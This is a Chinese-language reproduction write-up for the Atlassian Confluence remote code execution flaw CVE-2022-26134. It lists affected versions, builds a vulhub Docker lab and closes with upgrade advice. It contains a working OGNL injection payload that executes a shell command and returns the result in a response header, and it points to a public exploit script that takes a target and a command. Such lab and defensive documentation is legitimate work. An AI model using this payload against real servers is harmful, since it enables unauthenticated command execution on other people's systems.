漏洞概述


Atlassian Confluence 是一款各企业广泛使用的 wiki 系统。6月2日，Atlassian 官方发布了一则安全公告，通告了一个严重且已在野利用的远程代码执行漏洞 CVE-2022-26134，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。



影响范围



受影响版本：

  • 1.3.0 <= Confluence Server and Data Center < 7.4.17

  • 7.13.0 <= Confluence Server and Data Center < 7.13.7

  • 7.14.0 <= Confluence Server and Data Center < 7.14.3

  • 7.15.0 <= Confluence Server and Data Center < 7.15.2

  • 7.16.0 <= Confluence Server and Data Center < 7.16.4

  • 7.17.0 <= Confluence Server and Data Center < 7.17.4

  • 7.18.0 <= Confluence Server and Data Center < 7.18.1

不受影响版本：

  • Confluence Server and Data Center 7.4.17

  • Confluence Server and Data Center 7.13.7

  • Confluence Server and Data Center 7.14.3

  • Confluence Server and Data Center 7.15.2

  • Confluence Server and Data Center 7.16.4

  • Confluence Server and Data Center 7.17.4

  • Confluence Server and Data Center 7.18.1



漏洞环境搭建


1、vulhub中已经集成了CVE-2022-26134漏洞环境

2、执行如下命令

git clone https://github.com/vulhub/vulhub/

将vulhub环境拉取到本地

3、进入vulhub/confluence/CVE-2022-26134目录

4、执行docker-compose up -d开启漏洞环境镜像

5、待环境搭建成功后，执行如下命令

docker-compose ps

查看漏洞环境绑定的物理机环境端口

6、访问http://ip:8090，出现以下界面代表漏洞环境已经部署成功，现进入配置环节

7、将通过官网获得key输入输入框，点击Next

8、选择Standalone，点击next

9、进入数据库配置界面，在数据库配置界面填写数据库地址db、数据库名称confluence、用户名postgres、密码postgres，填写完毕后，点击Next

10、待数据库配置完毕后，进入Load Content界面，选择Example Site，进入Configure User Management界面

11、进入Configure User Management界面后，选择Manage Users and Groups within Confluence，进入Configure System Administrator Account界面

12、进入Configure System Administrator Account界面后，配置好系统管理员账户后点击Next

13、进入Setup Successful界面，点击start后环境即配置成功



漏洞复现


1、在Confluence登录界面，抓取数据包

2、漏洞poc如下

${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/

在burpsuite请求url编码后的poc，在服务端会出现响应头X-Cmd-Response，响应头X-Cmd-Response内容即为命令whoami的执行结果

3、也可通过https://github.com/Nwqda/CVE-2022-26134下载漏洞检测脚本检测目标是否存在该漏洞

首先执行如下命令

git clone https://github.com/Nwqda/CVE-2022-26134

将漏洞检测脚本下载到本地

4、脚本下载到本地后，进入脚本文件夹后执行

python cve-2022-26134.py https://target.com cmd

即可检测目标是否存在漏洞



漏洞修复


升级到Atlassian Confluence Server and Data Center至安全版本。

下载地址为：

https://www.atlassian.com/software/confluence/download-archives
